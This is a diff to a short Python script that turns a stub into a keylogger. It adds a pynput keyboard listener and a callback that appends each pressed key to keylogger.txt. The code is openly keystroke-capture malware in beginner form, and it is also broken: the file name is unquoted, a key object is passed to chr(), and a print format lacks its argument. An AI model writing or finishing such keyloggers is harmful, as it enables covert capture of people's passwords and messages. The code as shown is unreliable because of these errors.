@@ -14,13 +14,22 @@ def keyPressed(key):
     print("{0} pressed")
     # use 'a' bc we need to create new file if not exist already
     #   & we need file open for writing
-    with open(keylogger.txt, 'a') as keyLog:
+    with open(keylogger.txt, 'a') as keyFile:
         try:
-            print("Code Here")
+            keyChar = chr(key) # converts ascii to char
+            keyFile.write(keyChar) # logs char
         except:
-             print("ERROR")
+             print("CHAR ERROR")
 
-# need a keyReleased() func??
+# def KeyReleased(key): not needed bc not nec for tracking key
+
+def main():
+    # tells listener the on_press func is named kePressed
+    listener = keyboard.Listener(on_press = keyPressed)
+    listener.start() #starts the tracking/listener
+    input()
+
+
 
 
 
